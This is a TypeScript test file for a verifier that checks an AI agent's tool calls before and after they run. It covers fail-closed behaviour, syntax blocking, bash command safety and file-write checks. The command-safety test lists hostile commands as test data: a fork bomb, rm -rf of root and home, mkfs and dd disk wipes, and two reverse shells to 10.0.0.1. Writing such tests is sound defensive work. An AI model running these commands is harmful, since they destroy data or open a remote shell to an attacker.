import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { System2Client } from "../src/core/system2/client.ts";
import {
	checkCommandSafety,
	checkSyntax,
	verifyFileMutation,
	verifyPostExecution,
	verifyToolCall,
} from "../src/core/system2/verifier.ts";

describe("fail-closed", () => {
	it("System 2 client returns valid: false and code: SYSTEM2_DAEMON_OFFLINE when daemon is unreachable", async () => {
		const client = new System2Client("http://127.0.0.1:59999");
		const res = await client.verify({ code_or_expression: "x = 1", domain: "units" });
		expect(res.valid).toBe(false);
		expect(res.code).toBe("SYSTEM2_DAEMON_OFFLINE");
		expect(res.reason).toContain("fail-closed");
	});

	it("permits offline bypass when allowOfflineBypass is enabled in config", async () => {
		const client = new System2Client({ bridgeUrl: "http://127.0.0.1:59999", allowOfflineBypass: true });
		const res = await client.verify({ code_or_expression: "x = 1", domain: "safety" });
		expect(res.valid).toBe(true);
		expect(res.details).toContain("Verification bypassed");
	});

	it("blocks tool execution under fail-closed safety policy when daemon verification is required", async () => {
		const client = new System2Client("http://127.0.0.1:59999");
		const res = await verifyToolCall("bash", { command: "echo ok", requireDaemonVerification: true }, client);
		expect(res.allowed).toBe(false);
		expect(res.decision).toBe("block");
		expect(res.code).toBe("SYSTEM2_DAEMON_OFFLINE");
	});
});

describe("pre-execution", () => {
	it("blocks broken TypeScript/JavaScript/JSON syntax in write and edit tools", async () => {
		for (const [tool, path, content, rule] of [
			["write", "broken.ts", "const a = {;", "language_syntax"],
			["edit", "broken.js", "function ( {", "language_syntax"],
			["write", "broken.json", "{ bad: }", "json_syntax"],
		]) {
			const res = await verifyToolCall(tool, { path, content });
			expect(res.allowed).toBe(false);
			expect(res.decision).toBe("block");
			expect(res.violations?.[0].domain).toBe("syntax");
			expect(res.violations?.[0].rule).toBe(rule);
		}
	});

	it("allows valid TypeScript, JavaScript, and JSON", async () => {
		expect((await verifyToolCall("write", { path: "ok.ts", content: "export const x: number = 1;" })).allowed).toBe(
			true,
		);
		expect((await verifyToolCall("write", { path: "ok.js", content: "export const x = 1;" })).allowed).toBe(true);
		expect((await verifyToolCall("write", { path: "ok.json", content: '{"ok": true}' })).allowed).toBe(true);
	});

	it("blocks destructive bash commands: fork bombs, rm -rf root/home, reverse shells, disk ops", async () => {
		const blocked = [
			[":(){ :|:& };:", "no_fork_bomb"],
			["rm -rf /", "no_destructive_rm"],
			["rm -rf ~", "no_destructive_rm"],
			["rm -rf $HOME", "no_destructive_rm"],
			["nc -e /bin/sh 10.0.0.1 4444", "no_reverse_shell"],
			["bash -i >& /dev/tcp/10.0.0.1/8080 0>&1", "no_reverse_shell"],
			["mkfs.ext4 /dev/sda1", "no_destructive_disk"],
			["dd if=/dev/zero of=/dev/sda bs=1M", "no_destructive_disk"],
		];
		for (const [cmd, rule] of blocked) {
			const res = await verifyToolCall("bash", { command: cmd });
			expect(res.allowed, `Expected ${cmd} to be blocked`).toBe(false);
			expect(res.code).toBe("COMMAND_SAFETY_VIOLATION");
			expect(res.violations?.[0].rule).toBe(rule);
		}
	});

	it("allows safe terminal commands", async () => {
		for (const cmd of ["git status", "npm test", "rm -rf ./temp-dir"]) {
			expect((await verifyToolCall("bash", { command: cmd })).allowed).toBe(true);
		}
	});

	it("unit: checkSyntax and checkCommandSafety direct functions", () => {
		expect(checkSyntax("const x: number = 1;", "test.ts")).toBeNull();
		expect(checkSyntax("const x = {;", "test.ts")).not.toBeNull();
		expect(checkSyntax('{"ok": true}', "test.json")).toBeNull();
		expect(checkSyntax("{bad}", "test.json")).not.toBeNull();
		expect(checkCommandSafety(":(){ :|:& };:")?.rule).toBe("no_fork_bomb");
		expect(checkCommandSafety("rm -rf /")?.rule).toBe("no_destructive_rm");
		expect(checkCommandSafety("git status")).toBeNull();
	});
});

describe("post-execution", () => {
	let testDir: string;
	beforeEach(() => {
		testDir = mkdtempSync(join(tmpdir(), "s2-post-"));
	});
	afterEach(() => {
		try {
			rmSync(testDir, { recursive: true, force: true });
		} catch {}
	});

	it("confirms written file exists on disk and is non-empty, catching truncation defects", async () => {
		const f = join(testDir, "test.txt");
		writeFileSync(f, "line 1\nline 2\n");
		expect((await verifyPostExecution("write", { path: f })).allowed).toBe(true);

		const miss = await verifyPostExecution("write", { path: join(testDir, "missing.txt") });
		expect(miss.allowed).toBe(false);
		expect(miss.code).toBe("FILE_NOT_FOUND");

		const empty = join(testDir, "empty.txt");
		writeFileSync(empty, "");
		const emptyRes = await verifyPostExecution("write", { path: empty });
		expect(emptyRes.allowed).toBe(false);
		expect(emptyRes.code).toBe("FILE_TRUNCATED_OR_EMPTY");
		expect((await verifyPostExecution("write", { path: empty }, { allowEmpty: true })).allowed).toBe(true);
	});

	it("verifies line count delta matches expectation and verifyFileMutation works", async () => {
		const f = join(testDir, "delta.txt");
		writeFileSync(f, "line 1\nline 2\nline 3\n");
		expect(
			(await verifyPostExecution("write", { path: f }, { previousLineCount: 1, expectedLineDelta: 2 })).allowed,
		).toBe(true);

		const bad = await verifyPostExecution("write", { path: f }, { previousLineCount: 1, expectedLineDelta: 5 });
		expect(bad.allowed).toBe(false);
		expect(bad.code).toBe("LINE_DELTA_MISMATCH");

		expect((await verifyFileMutation(f)).allowed).toBe(true);
	});
});
